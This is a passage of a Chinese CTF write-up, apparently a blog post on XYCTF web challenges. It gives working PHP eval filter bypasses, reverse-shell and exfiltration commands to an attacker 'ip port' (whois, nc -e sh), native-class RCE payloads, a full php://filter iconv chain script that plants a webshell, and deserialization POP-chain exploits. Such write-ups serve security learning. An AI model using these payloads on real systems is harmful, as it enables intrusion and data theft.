/flag&quot;</span>)</span><br><span class="line">或者：a=current&amp;b=current</span><br><span class="line">current(<span class="built_in">array</span>)是返回当前数组元素(那我不删除，直接返回也行)</span><br></pre></td></tr></table></figure><p>一开始犯病了，其实这道题早出了，因为用的<code>array_pop</code>和<code>current</code>都是要参数是数组，然后我就传了个数组进来，后面看了学弟的payload才惊醒，这个<br /><strong>$b = $_POST;</strong><br />说明post的表单都是b数组的了，所以不需要再传数组了，我就说没啥大问题的嘞，还是得注意细节</p><p>其实，传进来的a都被删掉了，那么a传什么值都无所谓的吧，主要看还post了什么，那个就是b的值，不过我后面也没有再去试验过了，应该是这样的吧()</p><p>赛后看大家的wp，方法都多种多样的</p><h2 id="web-牢牢记住逝者为大"><a class="markdownIt-Anchor" href="#web-牢牢记住逝者为大"></a> Web 牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/8354?time__1311=n4%2BxuDgDBDyD9iDnDGrxBk8ojqqPoCQDfhDiKx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/8354?time__1311=n4%2BxuDgDBDyD9iDnDGrxBk8ojqqPoCQDfhDiKx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a><br />长度限制13，那就再传个参数进来当跳板，<strong>cmd=`$_GET[1]`</strong><br />eval执行命令需要<code>;</code>，同时前面注释掉了，<code>%0a</code>换行符截断一下，<code>%23</code>注释掉后面的</p><p><strong>cmd=%0a`$_GET[1]`;%23&amp;1=</strong><br />弹个shell<br /><strong>whois -h ip -p port `more /[b-z][b-z][@-z][b-z]`</strong></p><p>赛后发现，原来反弹shell还有一种可以不用<code>/bin/bash</code>的，<code>nc ip port -e sh</code>，这样的甚至不需要<code>/</code></p><p>还有一种是用<code>cp</code>的，虽然过滤了，但是<code>\</code>没有被过滤啊，可以转义<br /><code>c\p /[@-z][@-z][@-z]g 1.txt</code>，最后访问<code>1.txt</code>就可以了</p><h2 id="web-ezclass"><a class="markdownIt-Anchor" href="#web-ezclass"></a> Web ezClass</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>类？搜素发现PHP原生类<code>new $a($b);</code>这种就是可以利用原生类的特征<br /><a href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">https://ch1e.gitee.io/2021/11/12/yuanshenglei/</a><br />emmmm，还需要调用原生类的方法，跟搜到的大部分题型都不一样，而且<code>(new $a($aa))-&gt;$c()</code>应该是要作为函数来调用，<code>(new $b($bb))-&gt;$c()</code>作为参数调用，我们很容易想到<code>system</code>函数<br />找了好久发现，ArrayIterator类可以调用<code>current</code>方法来返回当前的值<br /><a href="https://php.github.net.cn/manual/zh/arrayiterator.current.php">https://php.github.net.cn/manual/zh/arrayiterator.current.php</a></p><p>关于ArrayIterator类利用的题目找到<br /><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><p>注意到属性需要传入数组，有<br /><code>/?a=ArrayIterator&amp;aa[]=system&amp;c=current&amp;b=ArrayIterator&amp;bb[]=ls /</code></p><p>赛后发现另外的思路<strong>利用php的Error类带出信息</strong><br /><code>/?a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</code></p><h2 id="web-ezlfi"><a class="markdownIt-Anchor" href="#web-ezlfi"></a> Web ezLFI</h2><p>LFI，本地文件包含<br />常见的PHP伪协议感觉都没反应，应该被过滤了？<br />flag位置是在<code>/readflag</code><br />可以<strong>利用filter过滤器的编码组合构造RCE</strong><br /><a href="https://cloud.tencent.com/developer/article/2287108?areaId=106001">https://cloud.tencent.com/developer/article/2287108?areaId=106001</a><br />原文<a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a><br />出自<strong>PHP_INCLUDE_TO_SHELL_CHAR_DICT，php://filter特性包含任意文件getshell</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:49819/?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;/readflag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">    filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">    <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># get rid of equal signs</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-ezserialize"><a class="markdownIt-Anchor" href="#web-ezserialize"></a> Web ezSerialize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先，绕过<code>$this-&gt;token === $this-&gt;password</code>，利用引用传递让二者相等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><strong>fpclosefpclosefpcloseffflllaaaggg.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>构造链子<strong>E()::__wakeup()-&gt;D()::__toString-&gt;B()::__get()-&gt;A()::__invoke()-&gt;C()::__call()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>saber_master_saber_master.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span 